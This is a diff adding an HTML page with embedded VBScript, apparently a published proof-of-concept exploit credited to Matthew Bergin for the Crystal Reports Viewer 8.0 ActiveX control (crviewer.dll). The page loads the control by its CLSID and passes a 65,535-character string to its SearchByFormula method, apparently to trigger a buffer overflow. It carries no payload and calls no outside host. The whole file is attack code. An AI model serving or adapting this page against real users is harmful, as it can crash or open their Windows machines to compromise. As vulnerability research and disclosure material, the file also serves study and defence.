@@ -1,0 +1,19 @@
+&lt;html&gt;
+Crystal Reporting Viewer v8.0.0.371
+Author: Matthew Bergin
+Website: www.berginpentesting.com
+Website: www.smashthestack.org
+&lt;object classid=&#039;clsid:C4847596-972C-11D0-9567-00A0C9273C2A&#039; id=&#039;target&#039; &gt;&lt;/object&gt;
+&lt;script language=&#039;vbscript&#039;&gt;
+ 
+targetFile = &quot;C:\WINDOWS\system32\crviewer.dll&quot;
+prototype  = &quot;Sub SearchByFormula ( ByVal formula As String )&quot;
+memberName = &quot;SearchByFormula&quot;
+progid     = &quot;CRVIEWERLib.CRViewer&quot;
+argCount   = 1
+ 
+arg1=String(65535, &quot;A&quot;)
+ 
+target.SearchByFormula arg1
+ 
+&lt;/script&gt;
